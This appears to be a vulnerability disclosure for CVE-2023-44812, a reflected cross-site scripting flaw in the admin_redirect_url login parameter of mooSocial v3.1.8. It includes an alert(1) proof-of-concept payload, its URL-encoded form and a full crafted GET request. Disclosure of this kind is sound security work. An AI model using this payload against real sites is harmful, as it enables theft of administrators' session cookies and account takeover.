# CVE-2023-44812
A reflected cross-site scripting (XSS) vulnerability in the **admin_redirect_url** parameter on user login function of mooSocial v3.1.8 which allows attackers to steal admin's session cookies and impersonate their account via a crafted URL.

Vulerable Parameter: **admin_redirect_url**

## Exploit - Proof of Concept (POC)

### Reflect cross-site scripting (XSS)  
```
Payload : "><script>alert(1)</script> 
FINAL Payload (URL encoded) : test%22%3e%3cscript%3ealert(1)%3c%2fscript%3etest
```
GET Request on [/moosocial/admin/home/login?admin_redirect_url=] :
```
GET /moosocial/admin/home/login?admin_redirect_url=aHR0cDovL2xvY2FsaG9zdC9tb29zb2NpYWwvYWRtaW4vcGx1Z2lucw%22%3e%3cscript%3ealert(1)%3c%2fscript%3etest HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: CAKEPHP=nidqufo1vqbqircuufs0mh98m4; 19edc47bb57545288d88183ca75c9a0bmooSocial[theme]=Q2FrZQ%3D%3D.7AxYtZYvgA%3D%3D
Upgrade-Insecure-Requests: 1
Referer: http://745f1976-76bd-42e5-9ece-01e2ad60316d.com/
Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="117", "Chromium";v="117"
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0
```

### Screenshot
![image](https://github.com/ahrixia/moosocial-adminredxxs/assets/35935843/566e4be6-c470-4eb0-bfce-983df797126d)



